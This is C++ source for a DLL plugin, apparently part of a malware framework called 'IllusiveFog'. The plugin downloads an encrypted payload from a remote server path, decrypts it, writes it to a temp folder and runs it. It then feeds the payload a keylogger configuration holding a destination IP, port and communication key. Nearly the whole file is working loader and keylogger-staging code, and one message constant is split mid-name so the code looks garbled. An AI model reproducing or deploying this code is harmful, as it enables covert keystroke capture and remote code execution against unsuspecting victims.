// dllmain.cpp : Defines the entry point for the DLL application.

#include "Load.h"


extern char pellet_dir[50] = "/api/tp/toz.j";
extern char bin_dir[50] = "/api/ml/";

typedef struct keylog_struct {
	char destip[20];
	int destport;
	char path[100];
	int timer;
	char commkey[50];

}keylog_struct, * Pkeylog_struct;

__declspec(dllexport) void run_ld(HANDLE local_event) {
	MSG msg;
	enum pellet_ec pelec;
	char* preffered_path = NULL;
	char* pellet = NULL;
	char* drp = NULL;
	DWORD get_size = 0;
	DWORD written_size = 0;
	ULONG results = 0;
	DWORD pellet_size = 0;
	Ppellet_info  pinfo = NULL;

	char* temp = NULL;
	Pld_path_info ldpathinfo = get_path_info();
	while (!PeekMessage(&msg, NULL, WM_USER, WM_USER, PM_NOREMOVE)) {
		SetEvent(local_event);
		GetMessage(&msg, NULL, NULL, NULL);
		if (msg.message == WM_
			
			_PLUGIN_LAUNCH) {
			Pplugin_param param = (Pplugin_param)msg.lParam;
#ifdef SOCKS5
			Psocket_address psockaddr = form_socket_address(param->pellet_struct->socks_ip, param->pellet_struct->sockport, param->pellet_struct->dest_ip, param->pellet_struct->destport, param->pellet_struct->enable_auth, param->pellet_struct->auth_user_id, param->pellet_struct->auth_user_pass);
#else

			Psocket_address psockaddr = form_socket_address(NULL, NULL, param->pellet_struct->dest_ip, param->pellet_struct->destport, param->pellet_struct->enable_auth, param->pellet_struct->auth_user_id, param->pellet_struct->auth_user_pass);
#endif
		
			pinfo = form_pellet_info(pinfo, param->pellet_struct->agent_id, pellet_dir, bin_dir, NULL);

			pellet = pellet_get_pellet(psockaddr, pinfo->pellet_dir, pellet, &results, get_size, &written_size);

			char* http_delimiter = "\r\n\r\n";

			pellet = pellet_xcrypt_pellet(pellet, param->pellet_struct->pellet_key, &pellet_size);
			Pkeylog_struct keylogs = (Pkeylog_struct)allocheap(sizeof(keylog_struct));
			strcpy(keylogs->destip, param->pellet_struct->dest_ip);
			strcpy(keylogs->path, pinfo->bin_dir);
			keylogs->destport = param->pellet_struct->destport;
			strcpy(keylogs->commkey, param->pellet_struct->comm_key);
			keylogs->timer = StrToIntA(param->param);
			if (keylogs->timer == 0) {
				keylogs->timer = StrToIntA(param->param + 1);
				if (keylogs->timer == 0) {
					keylogs->timer = StrToIntA(param->param + 2);
					if (keylogs->timer == 0) {
						keylogs->timer = StrToIntA(param->param + 3);
						if (keylogs->timer == 0)
							//send invalid timer errorcode
						keylogs->timer = 1;
					}
				}
			}
		
			if ((pwrite_file(ldpathinfo->temp_dir, pellet_size, pellet)) != pellet_ec_code_success) {



			}
			HANDLE g_std_in_rd = NULL, g_std_in_wr = NULL, g_std_out_rd = NULL, g_std_out_wr = NULL;
			SECURITY_ATTRIBUTES sa;
			sa.nLength = sizeof(SECURITY_ATTRIBUTES);
			sa.bInheritHandle = TRUE;
			sa.lpSecurityDescriptor = NULL;
			CreatePipe(&g_std_out_rd, &g_std_out_wr, &sa, 0);
			SetHandleInformation(g_std_out_rd, HANDLE_FLAG_INHERIT, 0);
			CreatePipe(&g_std_in_rd, &g_std_in_wr, &sa, 0);
			SetHandleInformation(g_std_in_wr, HANDLE_FLAG_INHERIT, 0);
			PROCESS_INFORMATION pi;
			STARTUPINFO si;
			ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
			ZeroMemory(&si, sizeof(STARTUPINFO));
			si.cb = sizeof(STARTUPINFO);
			si.hStdError = g_std_out_wr;
			si.hStdOutput = g_std_out_wr;
			si.hStdInput = g_std_in_rd;
			si.dwFlags |= STARTF_USESTDHANDLES;
			CreateProcess(ldpathinfo->temp_dir, NULL, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi);
			DWORD time = 10;
			DWORD dw_written = 0;
			WriteFile(g_std_in_wr, keylogs, sizeof(keylog_struct), &dw_written, 0);


			freeheap(pellet);



			free_socket_address(psockaddr);
			freeheap(keylogs);
			CloseHandle(g_std_in_wr);
			CloseHandle(g_std_in_rd);
			CloseHandle(g_std_out_wr);
			CloseHandle(g_std_out_rd);
			report(param->reporter_event, param->reporter_threadid, NULL);
			SetEvent(local_event);
			ResetEvent(local_event);
			continue;
		}
		else if (msg.message == WM_IllusiveFog_PLUGIN_TERMINATE) {

			//pdelete_file(ldpathinfo->temp_dir);
			//pdelete_file(ldpathinfo->fail_safe_dir);
			free_pellet_info(pinfo);

			ldr_path_info_free(ldpathinfo);
			ExitThread(0);
		}
	}
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

